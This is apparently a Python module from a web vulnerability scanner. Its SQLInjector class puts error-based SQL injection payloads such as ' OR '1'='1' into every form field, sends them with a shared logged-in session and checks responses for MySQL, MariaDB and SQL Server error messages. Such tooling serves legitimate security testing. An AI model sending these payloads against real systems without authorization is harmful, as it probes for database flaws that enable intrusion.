import requests
from urllib.parse import urljoin

class SQLInjector:
    def __init__(self, session):
        self.session = session # Share the session to keep cookies/login state
        # Simple error-based payloads
        self.payloads = ["'", '"', "' OR '1'='1", '" OR "1"="1']
        
        # Signatures of common database errors
        self.error_signatures = [
            "You have an error in your SQL syntax;",
            "Warning: mysql_fetch_array()",
            "check the manual that corresponds to your MariaDB server version",
            "quoted string not properly terminated",
            "unclosed quotation mark after the character string"
        ]

    def is_vulnerable(self, response):
        """Checks if any database error signatures appear in the response."""
        for error in self.error_signatures:
            if error.lower() in response.content.decode().lower():
                return True
        return False

    def scan_form(self, form_details):
        """
        Takes a form, tries injecting payloads into every input, 
        and checks for errors.
        """
        target_url = form_details["action"]
        vulnerabilities = []

        for payload in self.payloads:
            # We copy the inputs so we don't mess up the original list
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["type"] != "submit":
                    # Inject payload into the input value
                    data[input_tag["name"]] = payload
            
            # Send the request
            if form_details["method"] == "post":
                res = self.session.post(target_url, data=data)
            else:
                res = self.session.get(target_url, params=data)
            
            # Analyze response
            if self.is_vulnerable(res):
                print(f"[!] SQL Injection detected on {target_url} with payload: {payload}")
                vulnerabilities.append({
                    "url": target_url,
                    "type": "SQL Injection",
                    "payload": payload,
                    "details": "Database error message returned."
                })
                # If found, stop testing this form to save time
                break 
                
        return vulnerabilities